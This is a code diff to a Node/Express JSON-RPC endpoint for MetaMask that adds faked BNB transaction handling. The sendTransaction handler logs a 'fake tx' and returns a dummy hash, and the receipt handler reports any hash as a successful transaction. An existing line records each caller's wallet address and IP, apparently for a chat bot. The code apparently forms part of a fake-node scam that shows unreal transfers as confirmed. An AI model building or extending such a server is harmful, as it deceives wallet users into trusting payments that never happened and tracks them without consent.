@@ -467,12 +467,45 @@ app.post('/', (req, res) => {
     return res.json({ jsonrpc: '2.0', id, result: "0x" });
   }
 
+    // === NEW: transaction support for MetaMask ===
   if (method === 'eth_estimateGas') {
-    // Return a fixed reasonable gas limit (in hex)
-    const defaultGas = '0x5208'; // 21000, basic ETH transfer gas
-    console.log(`🕒 *${now()}* [eth_estimateGas] Returning default gas: ${parseInt(defaultGas, 16)}`);
-    return res.json({ jsonrpc: '2.0', id, result: defaultGas });
+    const tx = params[0];
+    const from = tx.from?.toLowerCase();
+    const to = tx.to?.toLowerCase();
+    const value = tx.value || '0x0';
+
+    console.log(`🛠 Estimating gas for tx: from ${from}, to ${to}, value ${weiHexToBNB(value)} BNB`);
+    // Return fixed gas amount (21000)
+    return res.json({ jsonrpc: '2.0', id, result: '0x5208' });
   }
+
+  if (method === 'eth_gasPrice') {
+    // Return 1 Gwei
+    return res.json({ jsonrpc: '2.0', id, result: '0x3B9ACA00' });
+  }
+
+  if (method === 'eth_sendTransaction') {
+    const tx = params[0];
+    console.log(`💸 Sending fake tx: from ${tx.from}, to ${tx.to}, value ${weiHexToBNB(tx.value)} BNB`);
+    const fakeTxHash = '0x' + '0'.repeat(64); // dummy transaction hash
+    return res.json({ jsonrpc: '2.0', id, result: fakeTxHash });
+  }
+
+  if (method === 'eth_getTransactionReceipt') {
+    const txHash = params[0];
+    return res.json({
+      jsonrpc: '2.0',
+      id,
+      result: {
+        transactionHash: txHash,
+        status: '0x1', // success
+        blockNumber: '0x100000',
+        gasUsed: '0x5208',
+        logs: []
+      }
+    });
+  }
+
 
   // Unknown methods
   const logMsg = `🕒 *${now()}*\n⚠️ Unknown RPC: \`${method}\`\n🧩 Wallet: *${wallet}*\n🌐 IP: \`${ip}\``;
